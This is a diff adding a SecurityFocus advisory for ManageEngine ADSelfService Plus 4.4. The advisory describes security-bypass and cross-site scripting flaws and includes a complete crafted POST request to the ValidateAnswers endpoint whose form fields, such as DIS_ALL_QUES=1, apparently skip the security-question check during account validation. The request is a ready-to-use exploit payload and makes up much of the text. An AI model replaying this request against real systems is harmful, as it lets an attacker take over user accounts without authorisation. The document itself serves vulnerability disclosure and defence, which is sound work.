@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/46331/info
+
+ManageEngine ADSelfService Plus is prone to multiple vulnerabilities, including multiple security-bypass and cross-site scripting vulnerabilities.
+
+Attackers can exploit these issues to bypass certain security restrictions and to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help them steal cookie-based authentication credentials and launch other attacks.
+
+ManageEngine ADSelfService Plus 4.4 is vulnerable; other versions may also be affected. 
+
+POST /accounts/ValidateAnswers?methodToCall=validateAll HTTP/1.1
+
+Host: SERVER
+User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/accounts/ValidateUser
+Cookie: JSESSIONID=8F93EB242EF06C51BE93EB0CEDA69085
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 294
+
+loginId=1501&Hide_Captcha=0&POLICY_ID=1&Confirm_Answer=1&SESSION_EXPIRY_TIME=5&LOGIN_NAME=alice&REM_SESSION_TIME=00%3A40&bAns=11111&bQues=PreDefined-2&bAns=22222&bQues=PreDefined-3&bAns=33333&bQues=PreDefined-4&bAns=44444&bQues=PreDefined-5&quesList=4&DIGEST=qodpgd&next=Continue&DIS_ALL_QUES=1
